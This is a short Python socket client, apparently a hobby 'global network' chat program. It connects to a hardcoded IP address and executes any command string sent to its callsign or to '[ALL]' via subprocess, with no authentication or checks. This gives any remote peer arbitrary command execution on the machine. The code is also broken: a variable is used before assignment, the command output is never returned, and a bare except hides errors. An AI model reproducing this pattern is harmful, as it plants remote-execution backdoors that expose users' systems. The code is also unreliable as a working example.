"""
PROGRAM NAME: Client.py
PROGRAM POURPOSE: To serve as a client for the global network [see more below]
DATE WRITTEN: 3-8-23
PROGRAMMER: Coulter C. Stutz
"""

import os
import socket
import threading
import subprocess
import iterate

callsign = "[US-E]"

# create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# get the local machine name
host = "107.2.237.13"

# connect to the server socket
client_socket.connect((host, 8000))

# function for handling server messages
def handle_server_messages():
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        message = data.decode()

        if "IGNORE" not in message_parsed["command"]:
            try:
                message_parsed = iterate.command(message)
                if message_parsed["from"] != callsign:
                    if message_parsed["to"] == callsign or message_parsed["to"] == "[ALL]":
                        # os.system(message_parsed["command"])
                        out = f'{callsign} --> {message_parsed["from"]}:{subprocess.check_output(message_parsed["command"])} IGNORE'
            except:
                None

        print(f"\n{message}")


# start a new thread to handle server messages
server_thread = threading.Thread(target=handle_server_messages)
server_thread.start()

while True:
    # read input from the user
    message = input(f"{callsign}@callsign:>>")
    message = f"{callsign} --> " + message
    print(message)
    client_socket.sendall(message.encode())
